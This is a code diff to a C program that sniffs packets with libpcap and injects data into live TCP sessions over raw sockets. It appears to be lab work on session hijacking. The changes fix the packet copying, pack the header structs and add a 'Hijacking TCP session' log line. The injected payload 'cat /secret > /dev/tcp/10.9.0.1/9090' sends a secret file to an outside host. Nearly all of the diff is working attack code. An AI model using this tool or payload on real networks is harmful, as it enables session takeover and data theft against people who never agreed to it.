@@ -19,7 +19,7 @@
 	typedef struct {                                                           \
 		Header_T header;                                                       \
 		u_char data[];                                                         \
-	} Name
+	} __attribute__((packed)) Name
 
 PACKET(eth_t, struct ether_header);
 PACKET(ip_t, struct iphdr);
@@ -110,6 +110,18 @@ void send_modified_packet(u_char *pkt_buf, const char *cmd) {
 	sin.sin_port = tcp->header.dest;
 	sin.sin_addr.s_addr = ip->header.daddr;
 
+	char src_ip[INET_ADDRSTRLEN];
+	char dst_ip[INET_ADDRSTRLEN];
+
+	inet_ntop(AF_INET, &ip->header.saddr, src_ip, INET_ADDRSTRLEN);
+	inet_ntop(AF_INET, &ip->header.daddr, dst_ip, INET_ADDRSTRLEN);
+
+	u_short src_port = ntohs(tcp->header.source);
+	u_short dst_port = ntohs(tcp->header.dest);
+
+	printf("Hijacking TCP session (src=%s:%hu dst=%s:%hu) with seq: %u\n",
+		   src_ip, src_port, dst_ip, dst_port, ntohl(tcp->header.seq));
+
 	sendto(sock, ip, total_ip_len, 0, (struct sockaddr *)&sin, sizeof(sin));
 
 	close(sock);
@@ -117,7 +129,11 @@ void send_modified_packet(u_char *pkt_buf, const char *cmd) {
 
 void sniff_tcp(u_char *user, const struct pcap_pkthdr *header,
 			   const u_char *packet) {
-	u_char *pkt_copy = (u_char *)strndup((const char *)packet, header->caplen);
+	u_char *pkt_copy = malloc(header->caplen);
+	if (pkt_copy) {
+		memcpy(pkt_copy, packet, header->caplen);
+	}
+
 	const char *new_payload = "\r cat /secret > /dev/tcp/10.9.0.1/9090 \r\n";
 
 	send_modified_packet(pkt_copy, new_payload);
